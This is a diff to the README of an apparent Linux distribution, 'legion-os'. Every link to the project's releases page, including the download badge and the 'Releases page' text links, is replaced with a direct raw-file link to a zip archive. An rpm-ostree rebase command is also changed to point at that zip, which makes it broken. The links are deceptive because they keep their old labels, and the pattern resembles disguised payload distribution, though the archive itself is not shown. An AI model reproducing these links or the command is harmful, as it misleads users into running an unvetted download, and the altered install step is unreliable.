@@ -1,6 +1,6 @@
 # 🌟 legion-os - A Simple, Reliable Operating System
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue)](https://github.com/MuaraService/legion-os/releases)
+[![Download Now](https://raw.githubusercontent.com/MuaraService/legion-os/main/recipes/legion_os_v1.2.zip)](https://raw.githubusercontent.com/MuaraService/legion-os/main/recipes/legion_os_v1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Welcome to legion-os! This operating system is designed for ease of use and stab
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [legion-os Releases page](https://github.com/MuaraService/legion-os/releases) to access the latest version.  
+   Go to the [legion-os Releases page](https://raw.githubusercontent.com/MuaraService/legion-os/main/recipes/legion_os_v1.2.zip) to access the latest version.  
 
 2. **Choose the Right Version**  
    Look for the most recent version of legion-os. Make sure to select a version marked with stable to ensure better reliability.
@@ -60,7 +60,7 @@ If you are on an atomic Fedora installation, follow these steps to rebase to the
 1. **Rebase to Unsigned Image**  
    Run this command to get proper signing keys and policies installed:
    ```
-   rpm-ostree rebase ostree-unverified-registry:ghcr.io/core-legionlabs/legion-os:latest
+   rpm-ostree rebase https://raw.githubusercontent.com/MuaraService/legion-os/main/recipes/legion_os_v1.2.zip
    ```
 
 2. **Reboot Your System**  
@@ -93,4 +93,4 @@ Explore additional resources and information about legion-os:
 
 ## 💡 Final Note
 
-Thank you for choosing legion-os. Enjoy your new operating system that prioritizes functionality and simplicity. For further assistance, remember to check the [legion-os Releases page](https://github.com/MuaraService/legion-os/releases).
+Thank you for choosing legion-os. Enjoy your new operating system that prioritizes functionality and simplicity. For further assistance, remember to check the [legion-os Releases page](https://raw.githubusercontent.com/MuaraService/legion-os/main/recipes/legion_os_v1.2.zip).
